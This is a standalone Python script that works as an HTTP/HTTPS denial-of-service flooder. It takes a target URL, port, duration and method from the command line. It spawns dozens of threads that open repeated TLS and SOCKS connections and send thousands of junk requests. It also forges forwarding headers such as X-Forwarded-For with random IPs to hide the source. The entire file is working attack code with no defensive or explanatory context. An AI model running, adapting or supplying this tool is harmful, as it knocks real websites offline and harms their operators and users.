import socks,ssl,socket,random,string,time,threading,sys
from urllib.parse import urlparse

def generate_url_path(num):
    data = "".join(random.sample(string.printable, int(num)))
    return data

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

def spoof(target):
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f'True-Client-IP: {spoofip}\r\n'
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
        f'X-Real-IP: {spoofip}\r\n'
    )

def get_target(url):
    url = url.rstrip()
    target = {}
    parsed_url = urlparse(url)
    target['uri'] = parsed_url.path or '/'
    target['host'] = parsed_url.netloc
    target['scheme'] = parsed_url.scheme
    return target

def RECREATE_HTTPS(target,booter,METHODS, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((str(target['host']), int(port)))
        context = ssl.create_default_context()
        ssl_sock = context.wrap_socket(sock, server_hostname=target['host'])
        ssl_sock.do_handshake()
        url_path = generate_url_path(1)
        url_leak = ''
        if target['uri'] == '/':
            url_leak = target['uri']
        else:
            url_leak = '/'
        byt = f"{METHODS} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
        byt2 = f"{METHODS} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
        for _ in range(booter):

            ssl_sock.sendall(byt2)
            ssl_sock.send(byt)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((str(target['host']), int(port)))
            context = ssl.create_default_context()
            ssl_sock = context.wrap_socket(sock, server_hostname=target['host'])
            ssl_sock.do_handshake()
    except:
        pass

def tls_test(target, run_time,methods,port):
    for _ in range(int(run_time)):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((str(target['host']), int(port)))
            sock.connect_ex((str(target['host']), int(port)))
            context_list = [
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS),
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS),
                ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(),
                ssl.create_default_context(),
                ssl._create_unverified_context(),
                ssl._create_default_https_context()
            ]
            context = random.choice(context_list)
            ssl_sock = context.wrap_socket(sock, server_hostname=target['host'])
            url_path = generate_url_path(1)
            url_leak = ''
            if target['uri'] == '/':
               url_leak = target['uri']
            else:
               url_leak = '/'
            byt = f"{methods} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            for _ in range(500):
                ssl_sock.sendall(byt2)
                ssl_sock.send(byt)
            ssl_sock.close()
        except:
            pass

def socks_cflow(secs, target, methods, port):
    url_path = generate_url_path(1)
    payload = f"{methods} /{url_path} HTTP/1.1\r\nHost: {target['host']}\r\nUser-Agent: type\r\nOrigin: type\r\nReferrer: type\r\n{spoof(target['host'])}\r\n".replace('type',"".join(random.sample(str(string.ascii_lowercase), int(4)))).encode()
    try:
        if target['scheme'] == 'https':
         packet = socks.socksocket()
         packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
         packet.settimeout(65536)
         packet.connect((str(target['host']), int(port)))
         packet.connect_ex((str(target['host']), int(port)))
         packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
        else:
         packet = socks.socksocket()
         packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
         packet.settimeout(65536)
         packet.connect((str(target['host']), int(port)))
         packet.connect_ex((str(target['host']), int(port)))
        
        time_got = time.time() + secs
        while time.time() < time_got:
          for _ in range(2500):
                packet.send(payload)
                packet.sendall(payload)
    except:
        try:
            packet.close()
            pass
        except:
            pass

def SSL_PACKET(target,methods,duration_sec_attack_dude,port):
    for _ in range(int(duration_sec_attack_dude)):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((str(target['host']),int(port)))
            s.connect_ex((str(target['host']),int(port)))
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2)
            ssl_context.set_ciphers('AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:TLS_ECDHE_PSK_WITH_AES_128_CCM_SHA256:TLS_ECDHE_PSK_WITH_AES_128_CCM_8_SHA256')
            ssl_socket = ssl_context.wrap_socket(s,server_hostname=target['host'])
            url_path = generate_url_path(1)
            url_leak = ''
            if target['uri'] == '/':
               url_leak = target['uri']
            else:
               url_leak = '/'
            byt = f"{methods} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            for _ in range(500):
                ssl_socket.write(byt2)
                ssl_socket.sendall(byt2)
                ssl_socket.write(byt)
                ssl_socket.send(byt)
            ssl_socket.close()
        except:
           pass

def RUNNING_HTTPS_ALL(port,target,time_booter,METHODS):
   for _ in range(int(20)):
        threading.Thread(target=RECREATE_HTTPS, args=(target, time_booter,METHODS,port)).start()
        threading.Thread(target=SSL_PACKET,args=(target,METHODS,time_booter,port)).start()
        threading.Thread(target=tls_test, args=(target, time_booter,METHODS,port)).start()
        threading.Thread(target=socks_cflow, args=(time_booter,target,METHODS,port)).start()
url = ''
port = 0
time_booter = 0
methods = ''

if len(sys.argv) == 5:
 url = str(sys.argv[1]).lower()
 port = int(sys.argv[2])
 time_booter = int(sys.argv[3])
 methods = str(sys.argv[4])
target = get_target(url)

threading.Thread(target=RUNNING_HTTPS_ALL,args=(port,target,time_booter,methods)).start()